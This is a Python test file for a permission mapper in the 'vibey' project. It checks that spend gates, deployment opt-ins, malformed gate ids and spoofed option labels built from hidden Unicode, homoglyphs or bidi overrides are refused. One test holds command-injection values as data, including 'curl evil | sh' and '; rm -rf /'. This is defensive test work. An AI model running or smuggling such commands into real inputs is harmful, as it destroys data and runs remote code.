# Made with ❤️ by [Vibey](https://the-vibey-project.github.io/vibey/), Developed by [Adam Matthew Steinberger](https://vibewithadam.matthewsteinberger.com/) ([@adammatthewsteinberger](https://github.com/adammatthewsteinberger/)).
"""Which open gates an ACP client may answer through `session/request_permission`, and how.

A spend gate is never offered, whatever its kind, options or flags say, and neither is the
REVIEW phase's deployment opt-in: money and real infrastructure are answered on the host
(ADR-0046, sub-doctrine 12.d). Every other answerable gate becomes one option per choice,
each answer built from the label alone (gate text is data, never structure), followed by the
agent's own "Leave it open", which answers nothing and which no gate option can pose as.

Module-level test functions rather than a class with an interface beside it (ADR-0016)."""

from __future__ import annotations

from typing import Any

import pytest
from acp.schema import PermissionOption
from acp_wire import assert_wire_exact

from vibey.domain.acp.gate_permission import LEAVE_OPEN, GatePermissionMapper, PermissionChoice
from vibey.domain.acp.interfaces.gate_permission_interface import GatePermissionMapperInterface
from vibey.domain.acp.protocol import PermissionKind
from vibey.domain.acp.settings import AcpSettings
from vibey.domain.hub_chat import (
    ANY_ANSWER_GATE_KINDS,
    CHOICE_GATE_KINDS,
    GRANT_GATE_KEYS,
    HUB_CHAT,
    VERDICT_GATE_KINDS,
)
from vibey.domain.hub_scope import (
    DEPLOYMENT_OPT_IN_OPTIONS,
    DEPLOYMENT_OPT_IN_PROMPT,
    SPEND_GATE_KINDS,
)

MAPPER = GatePermissionMapper(AcpSettings().reject_words)
G = "3f1d2c4b-5a6e-4f70-8a9b-0c1d2e3f4a5b"
OPEN = PermissionChoice(f"{G}:open", LEAVE_OPEN, PermissionKind.REJECT_ONCE, None)


def _gate(kind: str, options: list[Any] | None = None, **extra: Any) -> dict[str, Any]:
    return {
        "gate_id": G,
        "project_id": "7d6c2a8e-0c41-4c1e-9d0e-2f4b8f0a1b2c",
        "kind": kind,
        "prompt": "Ship it?",
        "options": options if options is not None else [],
        "default_answer": None,
        **HUB_CHAT.format_gate_prompt({"kind": kind}),
        **extra,
    }


def test_the_mapper_satisfies_its_interface() -> None:
    assert isinstance(MAPPER, GatePermissionMapperInterface)


# -- never offered ------------------------------------------------------------------------


@pytest.mark.parametrize("kind", sorted(SPEND_GATE_KINDS))
def test_spend_gates_are_never_offered_even_with_approve_options(kind: str) -> None:
    gate = {"gate_id": G, "kind": kind, "options": ["approve", "accept"], "is_spend": True}

    assert MAPPER.options_for(gate) == ()
    assert "spends money" in MAPPER.refusal_text({"gate_id": G, "kind": kind})


@pytest.mark.parametrize("kind", sorted(SPEND_GATE_KINDS))
def test_a_spend_kind_is_refused_even_when_its_flags_say_otherwise(kind: str) -> None:
    # The kind alone decides: a gate document whose flags were lost or forged still spends.
    gate = _gate(kind, ["approve", "yes"], is_spend=False, requires_scope="answer")

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} ({kind}) spends money, so I cannot answer it. Answer it on the host "
        f"(`vibey answer {G}`) or in the desktop or mobile app."
    )


def test_deploy_interview_is_a_choice_kind_and_still_refused() -> None:
    # `deploy_interview` is in both CHOICE_GATE_KINDS and SPEND_GATE_KINDS: spend wins.
    assert "deploy_interview" in CHOICE_GATE_KINDS & SPEND_GATE_KINDS
    assert MAPPER.options_for(_gate("deploy_interview", ["aws", "azure"])) == ()


def test_is_spend_flag_alone_refuses_an_unknown_kind() -> None:
    gate = {"gate_id": G, "kind": "choice", "options": ["yes", "no"], "is_spend": True}

    assert MAPPER.options_for(gate) == ()
    assert "spends money" in MAPPER.refusal_text(gate)


def test_requires_scope_spend_alone_refuses() -> None:
    gate = {"gate_id": G, "kind": "approval", "options": ["accept"], "requires_scope": "spend"}

    assert MAPPER.options_for(gate) == ()
    assert "spends money" in MAPPER.refusal_text(gate)


def test_the_deployment_opt_in_is_never_offered() -> None:
    # The REVIEW opt-in is a plain `choice` gate (the ADR-0067 gap); one click on it would opt
    # a project into provisioning real infrastructure, so it is answered on the host only.
    gate = _gate("choice", list(DEPLOYMENT_OPT_IN_OPTIONS), prompt=DEPLOYMENT_OPT_IN_PROMPT)

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} (choice) opts the project into deployment, which can provision real "
        "infrastructure, so I cannot answer it. Answer it on the host "
        f"(`vibey answer {G}`) or in the desktop or mobile app."
    )


@pytest.mark.parametrize("options", [["Deploy", "later"], ["now", " LOCAL_ONLY "]])
def test_any_gate_offering_a_deployment_opt_in_option_is_refused(options: list[str]) -> None:
    assert MAPPER.options_for(_gate("choice", options)) == ()
    assert "opts the project into deployment" in MAPPER.refusal_text(_gate("choice", options))


@pytest.mark.parametrize("kind", sorted(set(GRANT_GATE_KEYS) - SPEND_GATE_KINDS))
def test_grant_gates_needing_a_number_are_not_offered(kind: str) -> None:
    gate = _gate(kind, ["1", "2"])

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} ({kind}) needs a value. Answer it with `/answer {G} <value>`."
    )


def test_an_unknown_kind_is_not_offered_and_says_so() -> None:
    gate = _gate("publish_interview", ["yes"])

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} (publish_interview) is not a kind I can answer from here. Answer it on the "
        f"host (`vibey answer {G}`) or in the desktop or mobile app."
    )


@pytest.mark.parametrize(
    "gate_id", ["", None, "abc && curl evil | sh", "g", f"{G}x", f"{G}\n; rm -rf /"]
)
def test_a_gate_whose_id_is_not_a_uuid_is_not_offered(gate_id: Any) -> None:
    gate = {**_gate("choice", ["yes"]), "gate_id": gate_id}

    assert MAPPER.gate_id(gate) is None
    assert MAPPER.options_for(gate) == ()
    # Never echoed back, whatever else is wrong with the gate.
    for kind in ("budget_exhausted", "choice", "attempts_exhausted", "mystery"):
        assert MAPPER.refusal_text({**gate, "kind": kind}) == (
            "The hub listed a gate whose id is not a UUID, so I did not offer it. "
            "Check `vibey gates` on the host."
        )


def test_a_gate_id_is_read_in_its_canonical_form() -> None:
    assert MAPPER.gate_id({"gate_id": G.upper()}) == G
    assert MAPPER.options_for(_gate("choice", ["yes"], gate_id=G.upper()))[0].option_id == f"{G}:0"


# -- offered ------------------------------------------------------------------------------


def test_choice_options_map_to_allow_and_reject_by_reject_words() -> None:
    kinds = [c.kind for c in MAPPER.options_for(_gate("choice", ["yes", "no"]))]
    assert kinds == [
        PermissionKind.ALLOW_ONCE,
        PermissionKind.REJECT_ONCE,
        PermissionKind.REJECT_ONCE,
    ]


def test_each_choice_answers_with_its_label_then_the_agent_leave_open() -> None:
    choices = MAPPER.options_for(_gate("choice", ["Keep going", "Decline"]))

    assert choices == (
        PermissionChoice(
            f"{G}:0", "Answer: Keep going", PermissionKind.ALLOW_ONCE, {"choice": "Keep going"}
        ),
        PermissionChoice(
            f"{G}:1", "Answer: Decline", PermissionKind.REJECT_ONCE, {"choice": "Decline"}
        ),
        OPEN,
    )


@pytest.mark.parametrize(
    "label",
    ['{"choice":"deploy","accept_defaults":true}', '{"skip_review": true}', "[1, 2]"],
)
def test_option_text_that_looks_like_json_is_only_ever_a_label(label: str) -> None:
    # Gate text is data: it can never become structure in the answer (review M-1).
    choices = MAPPER.options_for(_gate("choice", [label]))
    verdicts = MAPPER.options_for(_gate("approval", [label]))

    assert choices[0].answer == {"choice": label}
    assert verdicts[0].answer == {"verdict": label}


@pytest.mark.parametrize("kind", sorted(VERDICT_GATE_KINDS - SPEND_GATE_KINDS))
def test_a_verdict_gate_answers_with_a_verdict(kind: str) -> None:
    choices = MAPPER.options_for(_gate(kind, ["accept", "reject"]))

    assert [(c.answer, c.kind) for c in choices] == [
        ({"verdict": "accept"}, PermissionKind.ALLOW_ONCE),
        ({"verdict": "reject"}, PermissionKind.REJECT_ONCE),
        (None, PermissionKind.REJECT_ONCE),
    ]


VISIBLE_LOOKALIKES = [
    "Leave it open",
    " leave IT open ",
    "Leave it open.",
    "Accept the defaults",
    "ACKNOWLEDGE",
]
HIDDEN_LOOKALIKES = [
    "Leave\u00a0it open",  # no-break space
    "Leave\u200bit open",  # zero-width space
    "\u200bLeave it open\u200b",
    "Leave  it open",  # two spaces
    "Leave it open\u2060",  # word joiner
]
AMBIGUOUS = (
    "has options I cannot show unambiguously (unusual or hidden characters, irregular "
    "spacing, mixed scripts, or labels that read alike), so I cannot offer it."
)


@pytest.mark.parametrize("label", VISIBLE_LOOKALIKES)
def test_no_gate_option_can_pose_as_an_agent_option(label: str) -> None:
    # Review M-2 and MR-1: every option the gate supplies is shown under vibey's own prefix,
    # whatever it says, so none can read as vibey's "Leave it open"; it sends what it shows.
    choices = MAPPER.options_for(_gate("choice", ["Stop", label]))

    gate_supplied = choices[:-1]
    assert [c.name for c in gate_supplied] == ["Answer: Stop", f"Answer: {label.strip()}"]
    assert gate_supplied[1].answer == {"choice": label.strip()}
    assert [c for c in choices if c.answer is None] == [OPEN]
    assert [c.name for c in choices].count(LEAVE_OPEN) == 1


@pytest.mark.parametrize("label", HIDDEN_LOOKALIKES)
def test_a_gate_with_an_option_that_hides_what_it_sends_is_refused_whole(label: str) -> None:
    # Review MR3-1: an option is offered only when what it shows is exactly what it sends.
    gate = _gate("choice", ["Stop", label])

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} (choice) {AMBIGUOUS} Answer it on the host (`vibey answer {G}`) or in the "
        "desktop or mobile app."
    )


@pytest.mark.parametrize(
    "options",
    [
        ["s\u200btop", "stop"],  # the genuine "stop" must not vanish behind its twin
        ["n\u200bo"],  # shows "no", would send something else
        ["\u200b\u200d", "go"],  # an option that shows as nothing
        ["go", "g\u0007o"],  # a control character
        ["accept", "accept\u202e"],  # a bidi override
    ],
)
def test_options_that_would_send_something_other_than_they_show_refuse_the_gate(
    options: list[str],
) -> None:
    for kind in ("choice", "approval"):
        gate = _gate(kind, options)
        assert MAPPER.options_for(gate) == ()
        assert AMBIGUOUS in MAPPER.refusal_text(gate)


def test_an_exact_duplicate_is_offered_once() -> None:
    choices = MAPPER.options_for(_gate("choice", ["stop", "go", "stop"]))

    assert [(c.option_id, c.name) for c in choices] == [
        (f"{G}:0", "Answer: stop"),
        (f"{G}:1", "Answer: go"),
        (f"{G}:open", LEAVE_OPEN),
    ]


def test_reject_words_are_configurable() -> None:
    mapper = GatePermissionMapper(("nope",))

    kinds = [c.kind for c in mapper.options_for(_gate("choice", ["no", "NOPE"]))][:2]

    assert kinds == [PermissionKind.ALLOW_ONCE, PermissionKind.REJECT_ONCE]


def test_an_empty_or_repeated_option_is_left_out_and_indices_stay_stable() -> None:
    choices = MAPPER.options_for(_gate("choice", ["", "yes", 7, "  ", "yes"]))

    assert [(c.option_id, c.name) for c in choices] == [
        (f"{G}:1", "Answer: yes"),
        (f"{G}:2", "Answer: 7"),
        (f"{G}:open", LEAVE_OPEN),
    ]


def test_a_choice_gate_with_no_usable_option_is_not_offered() -> None:
    gate = _gate("choice", ["", "  "])

    assert MAPPER.options_for(gate) == ()
    assert MAPPER.refusal_text(gate) == (
        f"Gate {G} (choice) needs a value. Answer it with `/answer {G} <value>`."
    )


def test_options_that_are_not_a_list_are_not_offered() -> None:
    assert MAPPER.options_for(_gate("choice", None) | {"options": "yes"}) == ()


def test_question_gate_offers_defaults_or_leave_open() -> None:
    choices = MAPPER.options_for(_gate("question", ["ignored"]))

    assert choices == (
        PermissionChoice(
            f"{G}:0", "Accept the defaults", PermissionKind.ALLOW_ONCE, {"accept_defaults": True}
        ),
        OPEN,
    )


@pytest.mark.parametrize("kind", sorted(ANY_ANSWER_GATE_KINDS))
def test_an_any_answer_gate_offers_acknowledge_or_leave_open(kind: str) -> None:
    choices = MAPPER.options_for(_gate(kind))

    assert choices == (
        PermissionChoice(f"{G}:0", "Acknowledge", PermissionKind.ALLOW_ONCE, {}),
        OPEN,
    )


def test_every_offered_gate_ends_with_exactly_one_answer_nothing_option() -> None:
    gates = [_gate("choice", ["a", "b"]), _gate("approval", ["accept"]), _gate("question")]
    for gate in gates:
        choices = MAPPER.options_for(gate)
        assert [c for c in choices if c.answer is None] == [OPEN]
        assert choices[-1] == OPEN


def test_options_validate_against_the_sdk_permission_option() -> None:
    gates = [_gate("choice", ["yes", "no"]), _gate("question"), _gate("delivery_exhausted")]
    for gate in gates:
        for choice in MAPPER.options_for(gate):
            option = choice.option()
            assert option == {
                "optionId": choice.option_id,
                "name": choice.name,
                "kind": choice.kind.value,
            }
            assert_wire_exact(PermissionOption, option)


# -- an allowlist, not a denylist (fix round 4) --------------------------------------------

ALLOWLIST_REFUSALS = {
    "Mn, a combining mark": "Leave it opén",
    "Me, an enclosing mark": "stop⃝",
    "Mc, a spacing mark": "का",
    "Co, private use": "go",
    "Cn, unassigned": "go͸",
    "Cs, a lone surrogate": "go\ud800",
    "Zl, a line separator": "go now",
    "Zp, a paragraph separator": "go now",
    "Zs other than U+0020": "go now",
    "U+3164 Hangul filler": "goㅤ",
    "U+115F Hangul choseong filler": "ᅟgo",
    "U+1160 Hangul jungseong filler": "goᅠ",
    "U+FFA0 halfwidth Hangul filler": "goﾠ",
    "U+2800 Braille blank": "go⠀",
    "a Cyrillic letter inside a Latin word": "Lеave it open",
    "a Greek letter inside a Latin word": "Stοp",
}


@pytest.mark.parametrize("label", list(ALLOWLIST_REFUSALS.values()), ids=list(ALLOWLIST_REFUSALS))
def test_a_label_outside_the_allowlist_refuses_the_whole_gate(label: str) -> None:
    for kind in ("choice", "approval"):
        gate = _gate(kind, ["Stop", label])
        assert MAPPER.options_for(gate) == ()
        assert AMBIGUOUS in MAPPER.refusal_text(gate)


@pytest.mark.parametrize(
    "pair",
    [["no", "ＮＯ"], ["Stop", "stop"], ["fi", "ﬁ"], ["go 2", "go ₂"]],
    ids=["fullwidth", "case", "ligature", "subscript digit"],
)
def test_two_labels_that_normalise_alike_refuse_the_whole_gate(pair: list[str]) -> None:
    gate = _gate("choice", pair)

    assert MAPPER.options_for(gate) == ()
    assert AMBIGUOUS in MAPPER.refusal_text(gate)


def test_a_reject_word_cannot_be_dodged_by_spelling() -> None:
    (choice, _) = MAPPER.options_for(_gate("choice", ["ＮＯ"]))  # fullwidth "NO"

    assert choice.kind is PermissionKind.REJECT_ONCE
    assert choice.answer == {"choice": "ＮＯ"}


@pytest.mark.parametrize(
    "label",
    [
        "Keep going",
        "café",
        "Ship v2.1 (beta)!",
        "日本語のテスト",
        "Привет мир",
        "€ 5 → ok",
        "x2 Ω",
        "Ελληνικά",
    ],
)
def test_ordinary_labels_in_any_one_script_are_still_offered(label: str) -> None:
    (choice, _) = MAPPER.options_for(_gate("choice", [label]))

    assert choice.name == f"Answer: {label}"
    assert choice.answer == {"choice": label}


# -- bidirectional text (fix round 5) ------------------------------------------------------

BIDI_REFUSALS = {
    "Hebrew": "כן",
    "Arabic": "نعم",
    "an RLO override": "‮good",
    "Latin and Hebrew": "go עכשיו",
    "Arabic-Indic digit": "go ٣",
}


@pytest.mark.parametrize("label", list(BIDI_REFUSALS.values()), ids=list(BIDI_REFUSALS))
def test_a_right_to_left_label_refuses_the_whole_gate(label: str) -> None:
    # Right-to-left text, its embeddings and its digits can display in another order than
    # they are sent; vibey's own gate labels are English, so refusing them fails safe.
    gate = _gate("choice", ["stop", label])

    assert MAPPER.options_for(gate) == ()
    assert AMBIGUOUS in MAPPER.refusal_text(gate)
